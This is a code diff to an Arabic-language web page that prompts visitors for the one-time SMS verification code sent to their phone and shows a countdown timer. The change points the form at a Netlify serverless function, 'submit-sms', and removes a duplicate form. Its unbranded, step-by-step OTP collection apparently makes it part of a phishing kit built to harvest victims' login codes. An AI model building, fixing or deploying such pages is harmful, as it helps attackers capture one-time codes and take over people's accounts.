@@ -51,7 +51,7 @@
                 <div class="tato">
                      <p>يرجى ادخال رمز التحقق المرسل الى هاتفك</p>
                 </div>
-                <form action="/netlify/functions/submit-sms.js" method="post">
+                <form action="/.netlify/functions/submit-sms" method="post">
                      <input type="hidden" name="step" value="sms">
                      <div class="content">
                          <div class="left">
@@ -78,31 +78,14 @@
                      </div>
                  </form>
               </div>
-<body>
-
-    <div class="sms-form">
-        <h1>رمز التحقق (OTP)</h1>
-        <p>الرجاء إدخال الرمز الذي تم إرساله إلى هاتفك المحمول.</p>
-        <form action="/.netlify/functions/submit-sms" method="POST">
-            <div class="input-group">
-                <label for="sms">رمز التحقق</label>
-                <input type="text" id="sms" name="sms" required>
             </div>
-          </div>
         </div>
-            <button type="submit" class="submit-btn">إرسال</button>
-        </form>
-    </div>
-
-
         <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
         <script>
-
              var timer2 = "02:00";
               var interval = setInterval(function() {
               var timer = timer2.split(':');
-              //by parsing integer, I avoid all extra string processing
               var minutes = parseInt(timer[0], 10);
               var seconds = parseInt(timer[1], 10);
               --seconds;
@@ -110,14 +93,9 @@
               if (minutes < 0) clearInterval(interval);
               seconds = (seconds < 0) ? 59 : seconds;
               seconds = (seconds < 10) ? '0' + seconds : seconds;
-              //minutes = (minutes < 10) ?  minutes : minutes;
               $('.countdown').html(minutes + ':' + seconds);
               timer2 = minutes + ':' + seconds;
               }, 1000);
-
-
-            
         </script>
-              
 </body>
 </html>
